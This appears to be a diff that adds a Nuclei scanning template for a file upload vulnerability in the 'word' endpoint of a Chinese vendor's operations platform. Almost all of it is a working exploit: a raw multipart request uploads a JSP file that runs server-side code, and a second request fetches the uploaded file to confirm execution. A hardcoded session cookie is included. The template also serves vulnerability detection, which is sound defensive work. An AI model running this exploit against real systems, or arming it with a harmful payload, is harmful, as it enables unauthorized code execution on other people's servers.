@@ -1,0 +1,54 @@
+id: zkjw-word-upload
+info:
+  name: 北京中科聚网信息技术有限公司一体化运营平台word接口存在文件上传漏洞
+  author: apple
+  severity: critical
+  description: 北京中科聚网信息技术有限公司一体化运营平台word接口存在文件上传漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /resources/files/ue/word HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Accept-Language: en-US;q=0.9,en;q=0.8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
+        Connection: close
+        Cache-Control: max-age=0
+        Content-Type: multipart/form-data; boundary=----3d8fa3de-dc1d-4a24-a272-f3e448e5c961
+        Content-Length: 200
+        Cookie:  JSESSIONID=9438c497-92ad-4800-b821-20602adec4ac; rememberMe=DQcKKIuzT47bdNWUqrwbm7lus89+rcIV76T4gjLO4SphCJRw6gxullXR9udKkk6i/NG7Uc60WHRESX9EwHokmstMa2I3K9puNySoBrRpTwPiNnHPT/YkOE2GDlu+DQ1gaUbw9GCWuWEB3fW+kigscyqkXJOPO66Y29tLjWQPy5I0B5Fb9guaGXbzLs27Jf0miwE=;
+
+        ------3d8fa3de-dc1d-4a24-a272-f3e448e5c961
+        Content-Disposition: form-data; name="file"; filename="test.jsp"
+        Content-Type: application/octet-stream
+
+        <% out.println("whoisceshi");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        ------3d8fa3de-dc1d-4a24-a272-f3e448e5c961
+      - |+
+        GET /{{dir_file}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+
+    extractors:
+      - type: regex
+        name: dir_file
+        internal: true
+        part: body_1
+        regex:
+          - '\/files\/headimg\/([a-fA-F0-9-]+)\.jsp'
+        
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'whoisceshi'
